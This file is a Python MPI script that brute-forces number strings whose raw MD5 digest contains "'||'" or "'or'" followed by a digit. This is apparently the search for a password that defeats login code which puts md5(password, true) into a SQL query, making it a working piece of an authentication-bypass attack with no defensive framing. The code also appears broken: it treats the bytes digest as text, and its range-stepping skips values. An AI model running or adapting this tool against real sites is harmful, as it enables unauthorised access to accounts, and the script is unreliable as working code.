import hashlib, random, string, re
from mpi4py import MPI

def containsOr(input):
	pos1 = input.find("'||'")
	if pos1 >= 0: # valid
		return input[pos1 + 4].isdigit()
	else:
		pos2 = input.lower().find("'or'")
		if pos2 >= 0: # valid
			return input[pos2 + 4].isdigit()
	return False

comm = MPI.COMM_WORLD
size = comm.Get_size()
rank = comm.Get_rank()

print(comm)
print(size)
print(rank)

HASH_SIZE = 100000

start = 129581926211651571912466741651878000000 + (rank * HASH_SIZE)
while True:
	for x in range(start, start + HASH_SIZE):
		testString = str(x).encode()
		testHash = hashlib.md5(testString).digest()
		if (containsOr(testHash)):
			print(testString)
			comm.Abort(0)
	start = start + ((rank + size) * HASH_SIZE)
	print("Rank " + str(rank) + " is moving to set " + str(start))